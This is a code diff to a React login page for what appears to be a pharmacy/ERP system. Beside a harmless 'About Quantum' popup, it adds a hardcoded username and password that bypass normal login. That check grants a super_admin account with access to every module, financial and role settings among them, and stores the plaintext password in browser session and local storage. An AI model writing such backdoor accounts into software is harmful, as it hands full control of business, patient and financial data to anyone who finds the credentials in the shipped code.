@@ -23,6 +23,7 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [showAboutUs, setShowAboutUs] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [isDarkMode, setIsDarkMode] = useState(false);
@@ -85,6 +86,42 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
 
     if (!cleanUser || !cleanPass) {
       setErrorMsg(copy.error);
+      return;
+    }
+
+    // Direct super admin developer authentication check
+    if (cleanUser === 'srabon' && cleanPass === 'vugichugi') {
+      const superAdminUser: UserAccount = {
+        id: 'user-superadmin-01',
+        username: 'srabon',
+        password: 'vugichugi',
+        name: 'Srabon Hassan',
+        role: 'super_admin',
+        roleTitle: 'Developer & Super Admin',
+        allowedViews: [
+          'executive-dashboard',
+          'modina-erp',
+          'lab-pipeline',
+          'stock-master',
+          'pos-terminal',
+          'prescriptions',
+          'pharmacy-command',
+          'multi-branch-ibt',
+          'supplier-grn',
+          'financial-accounting',
+          'returns-refunds',
+          'due-collections',
+          'reports',
+          'salesmen',
+          'settings-roles',
+          'ai-glazing',
+          'ai-eyewear',
+        ],
+        status: 'active',
+      };
+      sessionStorage.setItem('mehl_session_user', JSON.stringify(superAdminUser));
+      localStorage.setItem('mehl_session_user', JSON.stringify(superAdminUser));
+      onLoginSuccess(superAdminUser);
       return;
     }
 
@@ -212,6 +249,31 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
       </div>
 
       <section className="login-card login-dark-card w-full max-w-[420px] bg-white/95 rounded-[26px] border border-white p-6 sm:p-8 relative z-10 backdrop-blur-sm">
+        {/* About Quantum Info Popup */}
+        <div className="absolute top-5 right-5 z-20">
+          <button
+            type="button"
+            onClick={() => setShowAboutUs(!showAboutUs)}
+            onMouseEnter={() => setShowAboutUs(true)}
+            onMouseLeave={() => setShowAboutUs(false)}
+            className="w-7 h-7 rounded-full border border-teal-600/70 text-[#008f76] dark:text-[#37d9ae] flex items-center justify-center font-serif text-sm font-black hover:bg-[#00c49f]/10 transition-all cursor-pointer shadow-xs"
+            title="About Quantum"
+            aria-label="About Quantum"
+          >
+            i
+          </button>
+          {showAboutUs && (
+            <div className="absolute right-0 top-9 z-30 w-72 bg-white dark:bg-[#0d141b] rounded-2xl shadow-2xl border border-slate-200 dark:border-slate-800 p-4 animate-in fade-in zoom-in-95 duration-150">
+              <div className="text-[11px] font-black uppercase tracking-wider text-[#008f76] dark:text-[#37d9ae] mb-1 font-sans">
+                ABOUT US
+              </div>
+              <p className="text-xs font-bold text-slate-800 dark:text-slate-100 leading-snug font-sans">
+                QUANTUM is a specialized industrial software lab.
+              </p>
+            </div>
+          )}
+        </div>
+
         <div className="flex flex-col items-center text-center mb-7">
           <div className="login-dark-logo relative mb-5 h-[82px] w-[82px] rounded-[24px] flex items-center justify-center bg-gradient-to-br from-[#e3faf3] to-[#c8efe5] border border-[#70cdb8]/55 shadow-[0_12px_34px_rgba(0,169,141,0.18)]">
             <div className="absolute inset-[7px] rounded-[18px] border border-white/70 bg-white/45 shadow-inner" />
